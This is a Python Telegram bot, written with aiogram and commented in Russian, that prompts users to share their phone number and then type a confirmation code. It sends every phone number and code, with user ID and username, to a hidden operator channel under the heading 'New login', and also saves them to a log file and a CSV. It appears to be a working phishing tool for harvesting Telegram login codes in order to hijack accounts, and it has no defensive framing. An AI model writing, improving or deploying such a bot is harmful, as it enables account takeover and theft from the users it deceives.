#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# === Конфигурация окружения ===
TOKEN = os.getenv("PLAY", "").strip()        # токен бота
CHANNEL = os.getenv("CHANNEL", "").strip()   # ID канала/чата (например: -1003079638308)

if not TOKEN or not CHANNEL:
    raise RuntimeError("Нужно задать переменные окружения: PLAY (токен) и CHANNEL (id канала/чата).")

try:
    CHANNEL_ID = int(CHANNEL)
except ValueError:
    raise RuntimeError("CHANNEL должен быть целым числом (например: -1003079638308).")

# === Логи и CSV ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
# Дополнительно логируем в файл (Render хранит файлы эфемерно — ок для оперативного мониторинга)
file_handler = logging.FileHandler(LOG_FILE, encoding="utf-8")
file_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
logging.getLogger().addHandler(file_handler)

# Инициализация CSV (с заголовком)
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
        csv.writer(f).writerow(["timestamp", "user_id", "username", "phone", "code"])

# === FSM состояния ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# === Router и память ограничений ===
router = Router()
user_last_submit = {}  # {user_id: datetime} для лимита 1 отправка в 24ч

# === Вспомогательная: отправить и удалить через delay ===
async def send_and_delete(message: Message, text: str, delay: int = 10, reply_markup=None):
    msg = await message.answer(text, reply_markup=reply_markup)
    try:
        await asyncio.sleep(delay)
        await msg.delete()
    except Exception:
        pass

# === /start (корректный фильтр команд) ===
@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
    await message.answer("Нажми кнопку, чтобы отправить номер:", reply_markup=kb)
    await state.set_state(AuthFlow.waiting_for_phone)

# === Защита: если прислали текст вместо контакта на шаге телефона ===
@router.message(AuthFlow.waiting_for_phone, F.text)
async def need_contact(message: Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
    await message.answer("Нужен контакт с номером. Нажми кнопку ниже:", reply_markup=kb)

# === Приём контакта (номер телефона) ===
@router.message(AuthFlow.waiting_for_phone, F.contact)
async def handle_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await message.answer("Не удалось получить номер. Попробуй ещё раз кнопкой.")
        return
    await state.update_data(phone=phone)
    await message.answer("Теперь введи код подтверждения (до 6 цифр):")
    await state.set_state(AuthFlow.waiting_for_code)

# === Приём кода ===
@router.message(AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    now = datetime.now()

    # Лимит 1 отправка в 24 часа
    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await message.answer("⏳ Ты уже отправлял данные сегодня. Попробуй позже.")
        await state.clear()
        return

    code = (message.text or "").strip()
    if not code.isdigit() or len(code) > 6 or len(code) == 0:
        await message.answer("❌ Код должен быть числовым, 1–6 цифр. Введи ещё раз.")
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    username = (message.from_user.username or "").strip()
    timestamp = now.isoformat()

    # Формируем текст для канала
    text = (
        "📲 Новый логин:\n"
        f"Номер: {phone}\n"
        f"Код: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username if username else '—'}\n"
        f"Время: {timestamp}"
    )

    # Отправка в канал
    try:
        await bot.send_message(CHANNEL_ID, text)
    except Exception as e:
        logging.exception(f"Не удалось отправить в канал: {e}")

    # Лог в файл
    logging.info(f"Номер:{phone} | Код:{code} | UserID:{uid} | Username:@{username if username else '-'}")

    # Запись в CSV
    try:
        with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
            csv.writer(f).writerow([timestamp, uid, username, phone, code])
    except Exception as e:
        logging.exception(f"Ошибка записи CSV: {e}")

    user_last_submit[uid] = now
    await message.answer("✅ Данные отправлены.")
    await state.clear()

# === Служебные команды (по желанию) ===
@router.message(Command("ping"))
async def ping(message: Message):
    await message.answer("pong")

@router.message(Command("help"))
async def help_cmd(message: Message):
    await message.answer("Команды: /start — начать, /ping — проверить подключение.")

# === Запуск поллинга ===
async def main():
    bot = Bot(token=TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    logging.info("Бот запускается. Начинаем polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
